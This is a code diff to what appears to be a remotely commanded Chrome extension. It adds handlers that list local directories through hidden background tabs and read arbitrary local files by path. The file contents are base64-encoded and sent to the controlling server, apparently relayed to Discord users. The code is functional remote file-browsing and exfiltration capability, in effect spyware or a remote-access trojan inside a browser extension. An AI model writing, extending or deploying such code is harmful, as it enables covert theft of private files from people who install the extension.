@@ -238,6 +238,16 @@ async function processCommand(command) {
                 await openAndScreenshot(command.id, command.requestedById, command.url, command.closeAfter);
                 break;
 
+            case 'download_file':
+                console.log(`📥 File download requested by ${command.requestedBy} for path: ${command.filePath}`);
+                await downloadFile(command.id, command.requestedById, command.filePath);
+                break;
+
+            case 'list_files':
+                console.log(`📂 List files requested by ${command.requestedBy} for path: ${command.path}`);
+                await listFiles(command.id, command.requestedById, command.path);
+                break;
+
             default:
                 console.log(`⚠️ Unknown command type: ${command.type}`);
         }
@@ -1210,7 +1220,230 @@ async function sendCommandResponse(commandId, type, data, userId = null) {
     }
 }
 
+// ============ File Listing ============
+async function listFiles(commandId, userId, dirPath) {
+    let tabId = null;
+    try {
+        console.log(`📂 Listing files for: ${dirPath}`);
+        
+        let pathUrl = dirPath;
+        if (!pathUrl.startsWith('file://')) {
+            pathUrl = 'file://' + dirPath;
+        }
+
+        // Ensure trailing slash
+        if (!pathUrl.endsWith('/')) {
+            pathUrl += '/';
+        }
+
+        // Create a new tab (inactive/background if possible)
+        const tab = await chrome.tabs.create({
+            url: pathUrl,
+            active: false
+        });
+        tabId = tab.id;
+
+        // Wait for load
+        await waitForTabLoad(tabId, 5000); // 5s timeout
+        
+        // Give Chrome a moment to execute its internal script to populate the list
+        await new Promise(r => setTimeout(r, 500));
+
+        // Inject script to parse the directory listing
+        const results = await chrome.scripting.executeScript({
+            target: { tabId: tabId },
+            func: () => {
+                const items = [];
+                let debugInfo = "Started parsing. ";
+                
+                // Strategy 1: Parse Script `addRow`
+                const scripts = document.getElementsByTagName('script');
+                for (const script of scripts) {
+                    const content = script.textContent;
+                    if (content.includes('addRow(')) {
+                        debugInfo += "Found addRow script. ";
+                        // Split by addRow to handle them one by one
+                        const lines = content.split('addRow(');
+                        for (let i = 1; i < lines.length; i++) {
+                            const line = lines[i];
+                            try {
+                                // Extract first string (name) - tolerant regex
+                                const nameMatch = line.match(/^"([^"]+)"/);
+                                if (!nameMatch) continue;
+                                const name = nameMatch[1];
+                                
+                                if (name === '..' || name === '.') continue;
+                                
+                                // Extract entries
+                                const args = line.split(',');
+                                let isDir = false;
+                                // 3rd arg matches 1 for directory
+                                if (args.length >= 3) {
+                                  isDir = args[2].trim() === '1';
+                                }
+                                
+                                items.push({
+                                    name: name,
+                                    isDirectory: isDir,
+                                    size: '', // Skip size
+                                    date: '', // Skip date
+                                    source: 'script'
+                                });
+                            } catch (e) {
+                                // ignore
+                            }
+                        }
+                    }
+                }
+                debugInfo += `Script found ${items.length} items. `;
+
+                // Strategy 2: Parse DOM links (fallback & supplement)
+                const links = document.getElementsByTagName('a');
+                let domCount = 0;
+                
+                for (const link of links) {
+                    const name = link.innerText;
+                    const href = link.getAttribute('href');
+                    
+                    if (!href || href === 'javascript:void(0)' || href.startsWith('?')) continue;
+                    if (name === '../' || name === 'Parent Directory' || name === '.' || name === 'Name' || name === 'Size' || name === 'Date Modified') continue;
+                    
+                    const isDir = href.endsWith('/');
+                    const cleanName = (name.endsWith('/') ? name.slice(0, -1) : name).trim();
+                    if (!cleanName) continue;
+                    
+                    // Check duplicates
+                    if (!items.find(i => i.name === cleanName)) {
+                        items.push({
+                            name: cleanName,
+                            isDirectory: isDir,
+                            size: '',
+                            date: '',
+                            source: 'dom'
+                        });
+                        domCount++;
+                    }
+                }
+                debugInfo += `DOM added ${domCount} unique items. `;
+
+                return { items, debug: debugInfo, htmlSample: document.body.innerHTML.substring(0, 200) };
+            }
+        });
+
+        const result = results[0].result || { items: [] };
+        const items = result.items || [];
+        
+        console.log(`✅ Found ${items.length} items. Debug: ${result.debug}`);
+
+        // Close the tab
+        await chrome.tabs.remove(tabId);
+        
+        if (items.length === 0) {
+             throw new Error(`No items found. Debug: ${result.debug}`);
+        }
+
+        // Send to server
+        await sendCommandResponse(commandId, 'directory_list', {
+            path: dirPath,
+            items: items
+        }, userId);
+
+    } catch (error) {
+        console.error('❌ Error listing files:', error);
+        
+        // Use try-catch for cleanup
+        if (tabId) {
+            try { await chrome.tabs.remove(tabId); } catch (e) {}
+        }
+
+        await sendCommandResponse(commandId, 'directory_list', {
+            path: dirPath,
+            error: error.message
+        }, userId);
+    }
+}
+
+// ============ File Download ============
+async function downloadFile(commandId, userId, filePath) {
+    try {
+        console.log(`📥 Starting file download: ${filePath}`);
+        
+        // Ensure path starts with file://
+        let fileUrl = filePath;
+        if (!fileUrl.startsWith('file://')) {
+            fileUrl = 'file://' + filePath;
+        }
+        
+        // Extract filename from path
+        const fileName = filePath.split('/').pop() || 'downloaded_file';
+        
+        // Fetch the file using file:// protocol
+        const response = await fetch(fileUrl);
+        
+        if (!response.ok) {
+            throw new Error(`Failed to read file: ${response.status} ${response.statusText}`);
+        }
+        
+        // Get the file as blob
+        const blob = await response.blob();
+        const fileSizeMB = blob.size / (1024 * 1024);
+        
+        console.log(`📁 File loaded: ${fileName} (${fileSizeMB.toFixed(2)}MB)`);
+        
+        // Check file size (Discord limit: 25MB)
+        if (fileSizeMB > 25) {
+            throw new Error(`File too large: ${fileSizeMB.toFixed(2)}MB (Discord limit: 25MB)`);
+        }
+        
+        // Convert blob to base64
+        const base64Data = await new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onloadend = () => resolve(reader.result);
+            reader.onerror = reject;
+            reader.readAsDataURL(blob);
+        });
+        
+        // Determine file type from blob
+        const mimeType = blob.type || 'application/octet-stream';
+        
+        // Send to server
+        await sendCommandResponse(commandId, 'file_download', {
+            fileName: fileName,
+            filePath: filePath,
+            mimeType: mimeType,
+            size: blob.size,
+            sizeMB: fileSizeMB.toFixed(2),
+            data: base64Data
+        }, userId);
+        
+        console.log(`✅ File sent to server: ${fileName}`);
+        
+    } catch (error) {
+        console.error('❌ Error downloading file:', error);
+        await sendCommandResponse(commandId, 'error', { 
+            message: error.message,
+            filePath: filePath 
+        }, userId);
+    }
+}
+
 // ============ Helper Functions ============
+function waitForTabLoad(tabId, timeoutMs = 10000) {
+    return new Promise((resolve, reject) => {
+        const timer = setTimeout(() => {
+            reject(new Error('Tab load timeout'));
+        }, timeoutMs);
+
+        chrome.tabs.onUpdated.addListener(function listener(tid, info) {
+            if (tid === tabId && info.status === 'complete') {
+                chrome.tabs.onUpdated.removeListener(listener);
+                clearTimeout(timer);
+                resolve();
+            }
+        });
+    });
+}
+
 function updatePopupStatus(connected) {
     chrome.runtime.sendMessage({
         type: 'status_update',
